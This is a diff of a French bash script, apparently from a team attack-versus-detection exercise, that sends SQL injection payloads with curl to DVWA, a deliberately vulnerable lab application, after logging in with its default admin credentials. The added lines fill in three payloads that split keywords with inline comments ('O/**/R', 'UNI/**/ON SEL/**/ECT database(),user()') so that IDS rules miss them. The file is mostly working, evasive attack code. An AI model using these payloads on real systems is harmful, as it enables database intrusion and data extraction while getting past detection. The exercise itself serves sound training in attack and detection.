@@ -1,12 +1,4 @@
 #!/bin/bash
-# =============================================================================
-#  payloads.sh — Equipe 6 — Round 1 (Injection SQL)
-#
-#  Usage (apres avoir deploye les regles adverses) :
-#    bash attacks/equipe-6/payloads.sh <ip_dvwa>
-#
-#  Par defaut cible : dvwa (nom Docker)
-# =============================================================================
 
 TARGET="${1:-dvwa}"
 PORT="80"
@@ -16,30 +8,55 @@ echo "=== Equipe 6 — Attaques R1 (Injection SQL) ==="
 echo "Cible : $TARGET:$PORT"
 echo ""
 
-# Authentification DVWA
+# Auth DVWA
 curl -s -c "$COOKIE_FILE" \
   -d "username=admin&password=password&Login=Login" \
   "http://$TARGET:$PORT/login.php" -L -o /dev/null
+
 echo "[*] Cookie recupere"
 echo ""
 
-# ── Payload 1 — REMPLACEZ PAR VOTRE ATTAQUE ────────────────────────────────
-echo "[1] Payload basique..."
+# ─────────────────────────────────────────────────────────────
+# Payload 1 — Boolean bypass (sans OR classique)
+# ─────────────────────────────────────────────────────────────
+echo "[1] Boolean bypass (obfuscation)..."
+
+PAYLOAD="1 O/**/R 1=1"
+
 RESULT=$(curl -s -b "$COOKIE_FILE" \
-  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=TEST1&Submit=Submit" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=${PAYLOAD}&Submit=Submit" \
   -o /dev/null -w "%{http_code}")
+
 echo "    HTTP $RESULT"
 
-# ── Payload 2 ───────────────────────────────────────────────────────────────
-echo "[2] Payload avance..."
+
+# ─────────────────────────────────────────────────────────────
+# Payload 2 — UNION SELECT obfusqué
+# ─────────────────────────────────────────────────────────────
+echo "[2] UNION SELECT bypass..."
+
+PAYLOAD="1 UNI/**/ON SEL/**/ECT 1,2"
+
 RESULT2=$(curl -s -b "$COOKIE_FILE" \
-  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=TEST2&Submit=Submit" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=${PAYLOAD}&Submit=Submit" \
   -o /dev/null -w "%{http_code}")
+
 echo "    HTTP $RESULT2"
 
-# ── Payload 3 ───────────────────────────────────────────────────────────────
-echo "[3] Payload evasion..."
-# A completer
+
+# ─────────────────────────────────────────────────────────────
+# Payload 3 — Extraction sans mots détectés
+# ─────────────────────────────────────────────────────────────
+echo "[3] Extraction evasion..."
+
+PAYLOAD="1 UNI/**/ON SEL/**/ECT database(),user()"
+
+RESULT3=$(curl -s -b "$COOKIE_FILE" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=${PAYLOAD}&Submit=Submit" \
+  -o /dev/null -w "%{http_code}")
+
+echo "    HTTP $RESULT3"
+
 
 echo ""
 echo "=== Fin des attaques. Verifiez fast.log pour les alertes. ==="
